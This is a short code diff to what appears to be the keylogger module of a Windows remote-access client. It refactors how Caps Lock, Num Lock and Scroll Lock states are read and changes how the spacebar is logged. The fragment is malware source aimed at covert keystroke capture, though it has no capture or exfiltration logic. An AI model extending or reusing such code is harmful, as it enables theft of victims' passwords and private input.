@@ -59,9 +59,9 @@ namespace xClient.Core.Keylogger
                 AltKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed(),
                 ShiftKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed(),
                 // Modifier keys that have a state (toggle 'on' or 'off').
-                CapsLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CAPITAL).IsKeyToggled(),
-                NumLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_NUMLOCK).IsKeyToggled(),
-                ScrollLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SCROLL).IsKeyToggled()
+                CapsLock = KeyloggerHelpers.CapsLockToggled(),
+                NumLock = KeyloggerHelpers.NumLockToggled(),
+                ScrollLock = KeyloggerHelpers.ScrollLockToggled()
             };
 
             // To avoid having to repeatedly check if one of the modifier
@@ -178,7 +178,7 @@ namespace xClient.Core.Keylogger
         /// <summary>
         /// SPACEBAR key.
         /// </summary>
-        [KeyloggerKey("SPACE", true)]
+        [KeyloggerKey(" ")]
         VK_SPACE = 0x20,
 
         /// <summary>
